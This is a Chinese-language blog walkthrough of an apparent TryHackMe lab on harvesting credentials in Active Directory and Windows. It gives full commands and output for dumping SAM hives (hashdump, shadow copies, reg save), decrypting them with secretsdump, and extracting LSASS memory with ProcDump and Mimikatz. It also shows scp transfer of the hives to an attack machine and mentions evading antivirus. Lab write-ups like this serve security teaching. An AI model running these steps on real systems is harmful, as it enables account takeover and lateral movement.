<p>Active Directory会存储大量与用户、组、计算机等AD对象相关的信息。因此，枚举目标Active Directory环境是红队安全评估的重点之一。虽然活动目录(Active Directory)设计的很安全，但是管理员的一些错误配置可能会使Active Directory容易遭受各种攻击。</p>
<p>以下是一些可能会泄露用户凭据的Active Directory错误配置：</p>
<ul>
<li>用户描述：管理员可能会在新AD用户的描述中设置了密码，并将密码信息留在用户描述属性中，这就使得该帐户容易被攻击者进行未经授权的访问。</li>
<li>组策略SYSVOL：通过对存在漏洞的SYSVOL进行利用，攻击者可以使用已泄露的加密密钥来访问管理员帐户。(这部分内容将在下文中具体介绍)</li>
<li>NTDS：这是一个数据库文件，该文件会包含AD用户的凭据信息，因此它是攻击者的目标之一。</li>
<li>导致AD攻击的其他配置：错误的AD配置会使得相关的AD环境容易受到各种AD攻击，从而造成用户凭据泄露。</li>
</ul>
<h2 id="通过网络嗅探获取凭据">通过网络嗅探获取凭据</h2>
<p>在获得目标网络的初始访问权限之后，攻击者可以对本地计算机(包括AD环境)进行各种网络攻击，其中针对网络协议的中间人攻击允许攻击者在目标网络环境中创建恶意或欺骗性的资源，以窃取目标网络中的身份验证信息，如NTLM密码哈希值等。</p>
<pre><code class="hljs scss">reg query HKLM /f flag /t REG_SZ /s | findstr THM</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304170547403.png" alt="image-20240304170547403"></p>
<p>上述命令成功找到flag所在注册表的位置</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304170719917.png" alt="image-20240304170719917"></p>
<p>枚举目标AD环境，找到victim(受害者)用户在其描述部分所保存的密码值：</p>
<pre><code class="hljs scss">PS C:\Users\thm&gt; Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description

#Get-ADUser -Filter {Description -like "*password*"} -Properties * | Select-<span class="hljs-selector-tag">Object</span> DistinguishedName, SamAccountName, Description

<span class="hljs-selector-id">#Import-Module</span> ActiveDirectory
<span class="hljs-selector-id">#Get-ADUser</span> -<span class="hljs-attribute">Filter</span> * -Properties * | Select-<span class="hljs-selector-tag">Object</span> DistinguishedName, SamAccountName, Description</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304171303219.png" alt="image-20240304171303219"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304171334825.png" alt="image-20240304171334825"></p>
<h1 id="0x04-本地windows凭据">0x04 本地Windows凭据</h1>
<p>一般情况下，Windows操作系统会提供两种类型的用户帐户：本地和域。本地用户的详细信息会存储在本地Windows文件系统中，而域用户的详细信息则会存储在集中式的Active Directory中。本小节主要讨论本地用户帐户的凭据，并介绍我们应该如何获取这些本地Windows凭据。</p>
<h2 id="键盘记录器">键盘记录器</h2>
<p>键盘记录器是一种监视和记录计算机键盘输入活动的软件或硬件设备。键盘记录器最初是为合法目的而设计的，例如为软件开发或家长控制提供反馈；然而，它们也可能会被攻击者滥用以窃取数据。作为红队队员，针对繁忙的交互式环境通过键盘记录程序来查找目标用户的凭据是一个不错的选择。如果我们知道一个被入侵的目标机器有一个曾经登录过的用户，我们就可以使用Metasploit框架或者其他工具(充当键盘记录器)来尝试捕获用户的键盘记录，并尝试从这些记录中发现有效凭据。</p>
<p>关于键盘记录器的简单演示，请查看以下博客内容：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17476449.html">【THM】Exploiting Active Directory(利用AD域错误配置)-红队</a></li>
</ul>
<h2 id="安全帐户管理器sam-security-account-manager">安全帐户管理器(SAM-Security Account Manager)</h2>
<p>SAM是Microsoft Windows的一个系统内置数据库，其中包含了当前机器的本地帐户信息，如用户名和密码等，SAM数据库会以加密格式存储这些帐户详细信息，使它们更加难以被检索；此外，在Windows操作系统运行期间，SAM数据库文件不能被任何用户直接读取和访问。</p>
<p>tips：作为攻击者，我们有多种方法和攻击技巧可以转储Windows机器的SAM数据库文件的内容。</p>
<p>在本文我们已经部署的目标机器中，我们可以确认的是：我们无法直接复制或者读取<code>C:\Windows\System32\config\sam</code>文件。</p>
<pre><code class="hljs scss">#在目标机器上，通过使用以下命令可以确认我们无法访问SAM数据库

C:\Windows\system32&gt; type c:\Windows\System32\config\sam
type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32&gt; copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\ 
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
        <span class="hljs-number">0</span> <span class="hljs-built_in">file</span>(s) copied.</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304171924389.png" alt="image-20240304171924389"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304172134665.png" alt="image-20240304172134665"></p>
<h2 id="使用hashdump获取sam文件">使用HashDump获取SAM文件</h2>
<p>我们可以使用Metasploit Framework内置的hashdump功能来获取SAM数据库文件的内容副本。Metasploit框架会将代码注入到Windows机器的LSASS.exe进程中，从而转储与该进程对应的内存中的哈希值副本。有关hashdump的更多信息，请自行访问MSF发布方<a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/">rapid7的官方博客</a>。</p>
<pre><code class="hljs scss">#我们要在使用MSF针对目标机器获得了meterpreter shell会话之后，才能使用以下命令来执行HashDump。

meterpreter &gt; getuid
Server username: THM\Administrator
meterpreter &gt; hashdump
Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">98</span>d3b784d80d18385cea5ab3aa2a4261:::
Guest:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:<span class="hljs-number">502</span>:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
CREDS-HARVESTIN$:<span class="hljs-number">1008</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">443</span>e64439a4b7fe780db47fc06a3342d:::</code></pre>
<h2 id="通过卷影复制服务获取sam文件">通过卷影复制服务获取SAM文件</h2>
<p>我们还可以使用Microsoft卷影复制服务来获取SAM文件的内容，这个服务有助于在应用程序对卷进行读写时执行卷备份操作。有关卷影复制服务的更多信息，请自行参考<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service">Microsoft的相关文档页面</a>。</p>
<p>具体而言，我们将使用wmic创建一个卷影副本，这需要我们以管理员权限使用命令提示符(CMD)界面来完成，相关步骤如下所示：</p>
<ol>
<li>以管理员权限运行标准的cmd.exe程序。</li>
<li>执行wmic命令来创建一个关于C: drive的卷影副本。</li>
<li>验证步骤2中所创建的卷影副本是否可用。</li>
<li>从我们在步骤2中所创建的卷影副本中复制出SAM数据库文件。</li>
</ol>
<p>现在让我们实践一下上面所介绍的内容，以管理员权限运行cmd.exe，然后执行以下wmic命令：</p>
<pre><code class="hljs scss">#使用WMIC命令来创建一个关于系统C卷的影子副本

C:\Users\Administrator&gt; wmic shadowcopy call create Volume=<span class="hljs-string">'C:\'</span>
<span class="hljs-string">Executing (Win32_ShadowCopy)-&gt;create()</span>
<span class="hljs-string">Method execution successful.</span>
<span class="hljs-string">Out Parameters:</span>
<span class="hljs-string">instance of __PARAMETERS</span>
<span class="hljs-string">{</span>
<span class="hljs-string">        ReturnValue = 0;</span>
<span class="hljs-string">        ShadowID = "{30821F09-02EF-49E6-A858-2F6CEDBBF11B}";</span>
<span class="hljs-string">};</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304172513895.png" alt="image-20240304172513895"></p>
<p>tips：Windows Management Instrumentation-WMI，wmic含义为WMI(Windows管理工具)命令行，对应的应用程序为wmic.exe。</p>
<p>上述命令成功执行之后，我们就可以使用<code>vssadmin</code>(卷影复制服务管理-Volume Shadow Copy Service administrative)命令行工具来列出并确认我们已经创建了关于系统<code>C:</code>卷的影子副本：</p>
<pre><code class="hljs scss">#列出可用的卷影副本

C:\Windows\system32&gt;vssadmin list shadows
vssadmin <span class="hljs-number">1.1</span> - Volume Shadow Copy Service administrative command-line tool
(C) Copyright <span class="hljs-number">2001</span>-<span class="hljs-number">2013</span> Microsoft Corp.

Contents of shadow copy set ID: {<span class="hljs-number">2</span>b04f365-d3f6-<span class="hljs-number">48</span>c2-a610-<span class="hljs-number">00</span>b32854483b}
   Contained <span class="hljs-number">1</span> shadow copies at creation <span class="hljs-selector-tag">time</span>: <span class="hljs-number">3</span>/<span class="hljs-number">4</span>/<span class="hljs-number">2024</span> <span class="hljs-number">9</span>:<span class="hljs-number">25</span>:<span class="hljs-number">06</span> AM
      Shadow Copy ID: {b5a918e3-<span class="hljs-number">32</span>a9-<span class="hljs-number">4282</span>-<span class="hljs-number">97</span>b3-<span class="hljs-number">55</span>ae6aaa143b}
         Original Volume: (C:)\\?\Volume{<span class="hljs-number">19127295</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">100000000000</span>}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: <span class="hljs-string">'Microsoft Software Shadow Copy provider 1.0'</span>
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304172717217.png" alt="image-20240304172717217"></p>
<p>上面的输出结果显示我们已经成功地创建了一个关于<code>C:</code>的卷影副本，其路径如下：<code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</code></p>
<p>如前所述，SAM数据库会使用<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/RC4">RC4</a>或<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>加密算法来进行加密。为了解密SAM数据库文件，我们需要一个解密密钥，该密钥通常会存储在计算机的本地文件系统中：</p>
<blockquote>
<p>c:\Windows\System32\Config\system</p>
</blockquote>
<p>现在，我们可以将sam(SAM数据库文件)和system(存储了解密密钥的文件)从我们所生成的卷影副本中复制到计算机桌面，具体命令如下所示：</p>
<pre><code class="hljs scss">C:\Users\Administrator&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        <span class="hljs-number">1</span> <span class="hljs-built_in">file</span>(s) copied.

C:\Users\Administrator&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        <span class="hljs-number">1</span> <span class="hljs-built_in">file</span>(s) copied.</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304173017012.png" alt="image-20240304173017012"></p>
<p>得到上述两个文件之后，我们就可以将它们传输到我们的攻击机中(例如使用SCP命令来进行复制)。</p>
<h2 id="通过注册表配置单元获取sam文件">通过注册表配置单元获取SAM文件</h2>
<p>转储SAM数据库内容的另一种方法是通过Windows Registry Hives(Windows注册表配置单元)。Windows注册表会存储一些供Windows服务使用的SAM数据库内容的副本，而我们可以使用reg.exe来保存Windows注册表的值。如前所述，我们仍然需要基于两个文件来获取并解密SAM数据库文件的内容。</p>
<p>我们需要以管理员权限运行cmd.exe并执行以下命令：</p>
<pre><code class="hljs scss">#从本地注册表中保存SAM文件和system文件

C:\Users\Administrator\Desktop&gt;reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop&gt;reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304173259902.png" alt="image-20240304173259902"></p>
<p>我们可以用Impacket工具包中的一个工具来解密SAM文件：<code>secretsdump.py</code>，Impacket SecretsDump脚本会使用不同的技术从本地和远程系统中提取凭据。</p>
<p>我们先将SAM文件和system文件传输到我们的攻击机中，然后在攻击机上执行以下命令：</p>
<pre><code class="hljs scss">#在攻击机上执行以下命令

root<span class="hljs-keyword">@hekeats</span>:~# scp THM\\thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">63.254</span>:<span class="hljs-attribute">C</span>:/Users/Administrator/Desktop/sam-reg /tmp/
root<span class="hljs-keyword">@hekeats</span>:~# scp THM\\thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">63.254</span>:<span class="hljs-attribute">C</span>:/Users/Administrator/Desktop/system-reg /tmp/
#Password：Passw0rd!

┌──(root㉿kali)-[/home/hybcx/thm/impacket]
└─# python3 examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
Impacket v0.<span class="hljs-number">12.0</span>.dev1+<span class="hljs-number">20240130.154745</span>.<span class="hljs-number">97007</span>e84 - Copyright <span class="hljs-number">2023</span> Fortra

[*] Target system <span class="hljs-attribute">bootKey</span>: <span class="hljs-number">0</span>x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (<span class="hljs-attribute">uid</span>:<span class="hljs-attribute">rid</span>:<span class="hljs-attribute">lmhash</span>:nthash)
<span class="hljs-attribute">Administrator</span>:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404<span class="hljs-attribute">ee</span>:<span class="hljs-number">98</span>d3a787a80d08385cea7fb4aa2a4261:::
<span class="hljs-attribute">Guest</span>:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404<span class="hljs-attribute">ee</span>:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
<span class="hljs-attribute">DefaultAccount</span>:<span class="hljs-number">503</span>:aad3b435b51404eeaad3b435b51404<span class="hljs-attribute">ee</span>:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn<span class="hljs-string">'t have hash information.</span>
<span class="hljs-string">[*] Cleaning up... </span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304173912264.png" alt="image-20240304173912264"></p>
<p>在上面的命令中，我们将针对从Windows注册表中所提取的SAM文件和System文件进行凭据提取。<code>-sam</code>命令参数用于指定从Windows机器中所转储的sam文件在攻击机中的路径，<code>-system</code>命令参数则用于指定system文件在攻击机中的路径，此外，我们还需要在上述命令的末尾使用<code>LOCAL</code>命令参数来指定我们要解密的是LOCAL SAM文件，因为该工具也可以用来处理其他类型的解密。</p>
<p>注意：如果我们将上述命令的输出结果与使用Hashdump所获得的NTLM哈希值进行比较，那么我们会注意到它们的结果是不同的。因为SAM文件中的有些帐户是属于Active Directory的，它们的解密密钥并没有存储在我们上面所转储的System文件中；要解密这些AD帐户的凭据信息，我们还需要从Windows中转储SECURITY文件，该文件会包含用于解密Active Directory帐户的密钥。</p>
<p>一旦我们成功获得了目标帐户的NTLM哈希，那么我们就可以尝试使用Hashcat来破解它们，或者可以使用哈希传递(PtH)等技术来模拟这些哈希所对应的用户身份。</p>
<p>补充：</p>
<p>我们还可以通过SAM文件+mimikatz来读取密码，具体命令如下所示：</p>
<pre><code class="hljs scss">#先在目标机器上导出SAM和System文件
C:\Windows\system32&gt; reg save HKLM\SYSTEM sys.hiv 
C:\Windows\system32&gt; reg save HKLM\SAM sam.hiv

#将上述获得的sys.hiv和sam.hiv文件复制到mimikatz所在文件夹，运行mimikatz，输入lsadump::sam /system:sys.hiv /sam:sam.hiv，即可导出所有用户密码hash</code></pre>
<p>可参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/w1590191166/article/details/107350200/">在windows中抓取用户密码</a></p>
<pre><code class="hljs scss">#我们在目标机上以管理员身份运行Mimikatz工具(以管理员身份在目标机上运行cmd，然后再加载Mimikatz即可)
C:\Windows\system32&gt; C:\Tools\Mimikatz\mimikatz.exe

mimikatz# privilege::debug

mimikatz# token::elevate

mimikatz# lsadump::sam</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304174431281.png" alt="image-20240304174431281"></p>
<p>注意：此处我们所获得的Administrator并不是AD中的SID 500所对应的Administrator帐户，而是DSRM(目录服务还原模式)帐户，此帐户可用于启动DC、登录和尝试恢复AD，Windows网络在将Windows Server升级为DC(域控制器)的过程中会提示我们设置此密码。(相关验证过程请参考<a target="_blank" rel="noopener" href="https://happycamper84.medium.com/back-to-the-basics-ntds-dit-vs-sam-3defc9d685cc">返璞归真：NTDS.dit vs SAM</a>)</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304174705554.png" alt="image-20240304174705554"></p>
<h1 id="0x05-lsass本地安全认证子系统服务">0x05 LSASS(本地安全认证子系统服务)</h1>
<h2 id="什么是lsass">什么是LSASS？</h2>
<p>本地安全认证子系统服务(LSASS)是用于处理操作系统安全策略并能在系统上被强制执行的Windows进程，它会验证当前计算机上所登录的用户帐户，并确保该用户所提供的密码、散列和Kerberos票据正确。Windows系统会将凭据存储在LSASS进程中，使用户可以更方便地访问文件共享、SharePoint站点等网络资源，而无需在每次连接时都要求用户输入凭据。</p>
<p>LSASS进程对于红队来说是一个诱人的攻击目标，因为该进程的内存中会存储关于用户帐户的敏感信息。LSASS进程通常可被攻击者用于转储用户凭据，从而进行权限提升、窃取敏感数据或者进行内网横向移动。作为攻击者，如果我们有目标机器的管理员权限，那么我们就可以尝试转储目标机器的LSASS进程的内存，Windows系统会允许我们创建一个转储文件，该文件是给定进程的快照。我们可以通过访问相关的GUI或者使用命令提示符界面(CMD)来完成LSASS进程内存的转储操作，这种攻击在MITRE ATT&amp;CK框架中定义为“<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1003/001/">操作系统凭据转储:LSASS内存(T1003)</a>”。</p>
<h2 id="使用图形用户界面gui">使用图形用户界面(GUI)</h2>
<p>如果我们要使用计算机的GUI来转储任何正在运行的Windows进程，那么我们需要先打开任务管理器，然后在详细信息选项卡中找到所需的进程，右键单击它并选择“创建转储文件”。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304183014283.png" alt="image-20240304183014283"></p>
<p><strong>注：这里我点击发现没有权限，以管理员身份也不行</strong></p>
<p>在上述转储过程完成之后，目标机器将显示一个弹出消息，其中会包含已经转储的文件的路径，我们可以找到并复制该文件然后将它传输到我们的攻击机以离线提取其中的NTLM哈希值。</p>
<p>注意：如果目标机器的LSASS进程是受保护状态，那么我们在运行上述转储操作时会得到一个错误提示，除非我们成功修改与LSASS进程相关的注册表值。</p>
<p>我们也可以将上述所转储的进程相关文件复制到目标机器的Mimikatz文件夹下，然后再使用Mimikatz来处理LSASS进程的内存转储。</p>
<pre><code class="hljs scss">C:\Users\Administrator&gt;copy C:\Users\ADMINI~<span class="hljs-number">1</span>\AppData\Local\Temp\<span class="hljs-number">2</span>\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
        <span class="hljs-number">1</span> <span class="hljs-built_in">file</span>(s) copied.

#然后再使用MimiKatz来读取密码信息
#注意：要以管理员用户身份在目标机器上运行cmd

C:\Tools\Mimikatz&gt; mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::minidump lsass.DMP
mimikatz # sekurlsa::logonpasswords</code></pre>
<h2 id="使用系统内部套件">使用系统内部套件</h2>
<p>如果我们无法使用目标机器的GUI，那么我们也可以尝试使用ProcDump来转储进程，ProcDump是一个可以在命令行界面运行的系统内部进程转储实用程序。在与本文实验相关的目标机器中，系统内部套件的安装路径如下：<code>C:\Tools\SysinternalsSuite</code>。</p>
<p>我们可以指定一个正在运行的进程，在本例中是lsass.exe，然后像下面这样转储与进程相关的内存信息：</p>
<pre><code class="hljs scss">#在目标机器上使用procdump<span class="hljs-selector-class">.exe</span>转储LSASS进程的内存信息
#从lsass<span class="hljs-selector-class">.exe</span>进程的内存中转储出用户账户和密码，并保存为离线版的lsass<span class="hljs-selector-class">.dmp</span>文件。

C:\&gt; C:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump-<span class="hljs-number">1</span>.dmp

ProcDump v10.<span class="hljs-number">0</span> - Sysinternals process dump utility
Copyright (C) <span class="hljs-number">2009</span>-<span class="hljs-number">2020</span> Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[<span class="hljs-number">09</span>:<span class="hljs-number">09</span>:<span class="hljs-number">33</span>] Dump <span class="hljs-number">1</span> initiated: c:\Tools\Mimikatz\lsass_dump-<span class="hljs-number">1</span>.dmp
[<span class="hljs-number">09</span>:<span class="hljs-number">09</span>:<span class="hljs-number">33</span>] Dump <span class="hljs-number">1</span> writing: Estimated dump file size is <span class="hljs-number">162</span> MB.
[<span class="hljs-number">09</span>:<span class="hljs-number">09</span>:<span class="hljs-number">34</span>] Dump <span class="hljs-number">1</span> complete: <span class="hljs-number">163</span> MB written in <span class="hljs-number">0.4</span> seconds
[<span class="hljs-number">09</span>:<span class="hljs-number">09</span>:<span class="hljs-number">34</span>] Dump count reached.</code></pre>
<p>注意：我们在转储进程时需要写入内容到计算机磁盘，而且因为转储LSASS进程是攻击者常用的一种已知技术，所以，目标计算机上的反病毒软件产品可能会将我们的转储操作标记为恶意；也就是说，在现实环境中转储LSASS进程时，我们可能还需要尝试绕过目标机器上的反病毒程序。</p>
<p>然后再继续使用MimiKatz来读取密码信息：</p>
<pre><code class="hljs scss">#注意：要以管理员用户身份在目标机器上运行cmd

C:\Tools\Mimikatz&gt; mimikatz.exe

mimikatz # privilege::debug

mimikatz # sekurlsa::minidump lsass_dump-<span class="hljs-number">1</span>.dmp

mimikatz # sekurlsa::logonpasswords</code></pre>
<h2 id="使用mimikatz">使用MimiKatz</h2>
<p>Mimikatz是一个著名的工具，它常被用于从指定内存中提取密码、哈希、PIN和Kerberos票据等敏感信息。Mimikatz是一种后渗透工具，能够支持很多有用的攻击，例如哈希传递、票据传递以及构建Kerberos黄金票据等。Mimikatz可以处理目标操作系统的内存来尝试访问其中所包含的敏感信息，因此，该工具还需要攻击者具有目标机器的管理员权限或者系统权限才能成功转储内存、提取凭据。</p>
<p>我们可以使用Mimikatz工具来提取目标机的lsass.exe进程的内存转储，在本文相关的实验环境中，我们可以通过目标机器的<code>c:\Tools\Mimikatz</code>路径找到该工具。</p>
<p>目标机器上的LSASS进程是以SYSTEM权限运行的，因此，为了获取到用户的密码哈希值，我们需要具有目标机器的系统权限或者本地管理员权限。我们可以通过RDP界面在目标机器上以管理员身份运行并打开CMD，然后再执行mimikatz二进制文件，相关命令如下所示：</p>
<pre><code class="hljs scss">C:\Tools\Mimikatz&gt; mimikatz.exe

  .#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">18362</span> Jul <span class="hljs-number">10</span> <span class="hljs-number">2019</span> <span class="hljs-number">23</span>:<span class="hljs-number">09</span>:<span class="hljs-number">43</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
<span class="hljs-comment"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
<span class="hljs-comment"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span>
<span class="hljs-comment">  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span>

mimikatz #</code></pre>
<p>成功加载mimikatz之后，我们需要先检查一下当前权限以便确认我们能否进行内存访问，命令如下：</p>
<pre><code class="hljs scss">#检查当前用于访问内存的权限

mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK</code></pre>
